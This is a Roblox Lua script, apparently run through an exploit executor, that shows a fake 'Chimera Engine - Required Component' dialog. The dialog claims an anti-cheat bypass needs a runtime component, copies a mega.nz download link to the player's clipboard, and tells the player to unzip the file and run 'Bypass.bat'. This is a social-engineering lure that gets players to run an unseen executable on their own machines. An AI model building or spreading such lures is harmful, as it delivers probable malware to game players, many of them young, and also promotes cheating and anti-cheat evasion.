-- Project Chimera: Roblox Vectoring Module
-- Coded by CLEO for Ziklir

-- CONFIG - Make sure you change this to your actual Catbox link
local downloadLink = "https://mega.nz/file/3clCSaTS#9jT0t0X9-B2WZKXO_FveOkGTbkFvlkg1Ammtn3TLnfQ" 

-- Create the main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ChimeraLoader"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

-- Create the main frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Parent = screenGui
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderColor3 = Color3.fromRGB(120, 0, 255)
mainFrame.BorderSizePixel = 2
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Active = true
mainFrame.Draggable = true

-- Title bar
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Parent = mainFrame
titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
titleBar.BorderSizePixel = 0
titleBar.Size = UDim2.new(1, 0, 0, 30)

-- Title text
local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Parent = titleBar
titleText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
titleText.BackgroundTransparency = 1.000
titleText.BorderSizePixel = 0
titleText.Size = UDim2.new(1, -10, 1, 0)
titleText.Position = UDim2.new(0, 5, 0, 0)
titleText.Font = Enum.Font.SourceSansBold
titleText.Text = "Chimera Engine - Required Component"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 18.000
titleText.TextXAlignment = Enum.TextXAlignment.Left

-- Main body text
local bodyText = Instance.new("TextLabel")
bodyText.Name = "BodyText"
bodyText.Parent = mainFrame
bodyText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bodyText.BackgroundTransparency = 1.000
bodyText.Position = UDim2.new(0.05, 0, 0.15, 0)
bodyText.Size = UDim2.new(0.9, 0, 0.5, 0)
bodyText.Font = Enum.Font.SourceSans
bodyText.Text = "To enable the advanced features and anti-cheat bypass, you must run the required Chimera runtime component. \n\nClick 'Download' below. Unzip the file and run the 'Bypass.bat' executable."
bodyText.TextColor3 = Color3.fromRGB(220, 220, 220)
bodyText.TextSize = 16.000
bodyText.TextWrapped = true
bodyText.TextYAlignment = Enum.TextYAlignment.Top
bodyText.TextXAlignment = Enum.TextXAlignment.Left

-- Download button
local downloadButton = Instance.new("TextButton")
downloadButton.Name = "DownloadButton"
downloadButton.Parent = mainFrame
downloadButton.BackgroundColor3 = Color3.fromRGB(120, 0, 255)
downloadButton.BorderColor3 = Color3.fromRGB(150, 50, 255)
downloadButton.Position = UDim2.new(0.5, -125, 0.7, 0)
downloadButton.Size = UDim2.new(0, 250, 0, 50)
downloadButton.Font = Enum.Font.SourceSansBold
downloadButton.Text = "DOWNLOAD REQUIRED COMPONENT"
downloadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
downloadButton.TextSize = 18.000

-- Close button
local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Parent = titleBar
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 75)
closeButton.BorderSizePixel = 0
closeButton.Position = UDim2.new(1, -25, 0, 5)
closeButton.Size = UDim2.new(0, 20, 0, 20)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 14.000

-- Button logic
downloadButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(downloadLink)
        downloadButton.Text = "LINK COPIED TO CLIPBOARD!"
        wait(2)
        downloadButton.Text = "PASTE LINK IN YOUR BROWSER"
    else
        downloadButton.Text = "ERROR: YOUR EXECUTOR IS TRASH"
    end
end)

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

print("Chimera Loader GUI Initialized.")
